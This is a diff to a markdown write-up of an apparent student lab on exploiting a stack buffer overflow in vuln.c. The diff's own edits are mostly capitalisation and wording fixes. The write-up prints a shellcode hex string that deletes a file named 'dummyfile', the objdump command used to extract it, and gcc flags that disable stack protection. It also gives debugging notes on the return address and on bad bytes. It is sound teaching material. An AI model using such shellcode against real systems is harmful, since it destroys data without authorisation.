@@ -2,7 +2,7 @@
 
 ## Target
 
-- delete `dummyfile` file by using `buffer overflow` to `inject code` into `vuln.c` file
+- Delete `dummyfile` file by using `buffer overflow` to `inject code` into `vuln.c` file
 
 ## Prepare for lab
 
@@ -30,7 +30,7 @@
 
 ![Ảnh chụp màn hình 2024-09-17 100229](https://github.com/user-attachments/assets/a3ea15ac-5d75-498e-8adc-7f0eac6cf64c)
 
-- Hexstring of my file_del.asm using:
+- Hexstring of my `file_del.asm` using:
 
   > for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
 
@@ -40,11 +40,11 @@
 
   > \xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00
 
-- stack frame of `vuln.c`.
+- Stack frame of `vuln.c`.
 
 ![Ảnh chụp màn hình 2024-09-17 103054](https://github.com/user-attachments/assets/4a0f9a06-5b08-4eb1-96bd-87167d56176b)
 
-- compile the vuln.c program using:
+- Compile the `vuln.c` program using:
   > gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
 
 ## execution.
@@ -59,15 +59,15 @@
 
 ![Ảnh chụp màn hình 2024-09-17 105402](https://github.com/user-attachments/assets/6268b9b7-4d87-45c3-b217-995e4fef445a)
 
-- the address red is `ebp`.
-- the address green is `Return Address`.
-- `continue`
+- The red address is `ebp`.
+- The green address is `Return Address`.
+- We `continue`
 
 ![Ảnh chụp màn hình 2024-09-17 105952](https://github.com/user-attachments/assets/a5373985-2e18-4c68-843f-585c41af45aa)
 
-- Comparing to the hexstring, the first three 3 values are the same buf after that everything is different and `Return Address` is not `\xff\xff\xff\xff`.
+- Comparing to the hexstring, the first 3 values are the same buf after that everything is different and `Return Address` is not `\xff\xff\xff\xff`.
 
-  - we have `\x0a(/n)` in the hex string.
+  - We have `\x0a(/n)` in the hexstring.
   - `\x00` have problem in 32 bits register `eax`.
 
 ![Ảnh chụp màn hình 2024-09-17 110946](https://github.com/user-attachments/assets/3e26783d-ccda-4009-b1b2-d019b622a806)
